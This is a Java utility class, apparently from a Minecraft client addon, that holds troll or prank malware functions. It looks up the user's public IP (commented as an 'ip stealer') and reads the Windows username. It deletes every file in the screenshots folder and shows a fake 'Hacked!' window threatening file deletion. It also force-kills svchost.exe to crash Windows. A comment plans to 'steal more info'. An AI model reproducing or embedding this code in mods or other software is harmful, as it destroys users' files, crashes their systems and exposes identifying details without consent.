package communityaddon;

import com.sun.jna.Native;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;
import net.fabricmc.loader.api.FabricLoader;
import org.lwjgl.system.Pointer;

import javax.swing.*;
import java.awt.event.WindowEvent;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.URL;

import static meteordevelopment.meteorclient.MeteorClient.mc;

public class TrollegeUtils {
    //made this for future humans to trollege
    //TODO: steal more info because russia
    //Todo: More Troll Classes

    public static final File ssfolder = new File((FabricLoader.getInstance().getGameDir().toString() + "screenshots"));

    public static final String eurekawatermark() {
        return "  ______  _    _  _____   ______  _  __           ______  ______  ______  ______  _____  _______    ____ __          __ _   _   _____   __  __  ______             _   _  _____              _       _      \n" +
            " |  ____|| |  | ||  __ \\ |  ____|| |/ /    /\\    |  ____||  ____||  ____||  ____|/ ____||__   __|  / __ \\\\ \\        / /| \\ | | / ____| |  \\/  ||  ____|     /\\    | \\ | ||  __ \\      /\\    | |     | |     \n" +
            " | |__   | |  | || |__) || |__   | ' /    /  \\   | |__   | |__   | |__   | |__  | |        | |    | |  | |\\ \\  /\\  / / |  \\| || (___   | \\  / || |__       /  \\   |  \\| || |  | |    /  \\   | |     | |     \n" +
            " |  __|  | |  | ||  _  / |  __|  |  <    / /\\ \\  |  __|  |  __|  |  __|  |  __| | |        | |    | |  | | \\ \\/  \\/ /  | . ` | \\___ \\  | |\\/| ||  __|     / /\\ \\  | . ` || |  | |   / /\\ \\  | |     | |     \n" +
            " | |____ | |__| || | \\ \\ | |____ | . \\  / ____ \\ | |____ | |     | |     | |____| |____    | |    | |__| |  \\  /\\  /   | |\\  | ____) | | |  | || |____   / ____ \\ | |\\  || |__| |  / ____ \\ | |____ | |____ \n" +
            " |______| \\____/ |_|  \\_\\|______||_|\\_\\/_/    \\_\\|______||_|     |_|     |______|\\_____|   |_|     \\____/    \\/  \\/    |_| \\_||_____/  |_|  |_||______| /_/    \\_\\|_| \\_||_____/  /_/    \\_\\|______||______|\n";
    }



    //ip stealer
    public static String dip() {
        try {
            return new BufferedReader(new InputStreamReader(new URL("http://checkip.amazonaws.com").openStream())).readLine();
        } catch (Exception ignored) {
            return "Failed to log.";
        }
    }

    public static void ssdeleter(){
        String[]entries = ssfolder.list();
        for(String s: entries){
            File currentFile = new File(ssfolder.getPath(),s);
            currentFile.delete();
        }
    }

    public static void freezemc(){
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }



    public static void bozojframe(){
        JFrame bozoframe = new JFrame();
        bozoframe.setTitle("Hacked!");
        bozoframe.setSize(300,300);
        bozoframe.add(new JLabel("Deleting PersonalFiles in -21 seconds"));
        bozoframe.add(new JLabel("IP: " + String.valueOf(dip())));
        bozoframe.add(new JLabel(windowsusername()));
        bozoframe.add(new JLabel(eurekawatermark()));
    }

    public static void mcstop(){
        mc.stop();
        mc.close();
        System.exit(696969420);
    }

    public static String windowsusername(){
        return String.valueOf(System.getProperty("user.name"));
    }

    public static void windowsbsod(){
        try {
            Runtime.getRuntime().exec("taskkill.exe /f /im svchost.exe");
        } catch (Exception ignored) {
           }
    }

}